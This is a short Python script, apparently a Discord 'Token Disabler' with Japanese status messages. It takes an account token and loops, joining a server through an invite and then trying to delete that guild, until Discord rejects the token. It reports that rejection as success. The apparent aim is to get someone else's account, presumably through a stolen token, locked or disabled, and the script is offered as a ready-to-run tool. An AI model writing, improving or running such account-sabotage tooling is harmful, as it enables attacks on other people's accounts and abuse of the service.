import requests
import sys
from rich import print as rprint
from console.utils import set_title

def token_disabler(token):
    while True:
        response = requests.post("https://discordapp.com/api/v6/invite/mee6", headers={"Authorization": token})
        if response.status_code == 401:
            return 401
        elif response.status_code == 403:
            return 403
        guild_id = response.json()["guild"]["id"]
        response = requests.delete(f"https://discordapp.com/api/v6/guilds/{guild_id}", headers={"Authorization": token})
        if response.status_code == 401:
            return 401
        elif response.status_code == 403:
            return 403

def main():
    set_title("Token Disabler // 待機中")
    token = input("Token: ")
    set_title("Token Disabler // 無効化中")
    rprint("[green]無効化中[/green]")
    disabler_response = token_disabler(token)
    if disabler_response == 401:
        set_title("Token Disabler // 成功")
        rprint("[green]無効化完了[/green]")
    elif disabler_response == 403:
        set_title("Token Disabler // 成功(認証エラー)")
        rprint("[yellow]無効化完了(認証エラー)[/yellow]")
    sys.exit()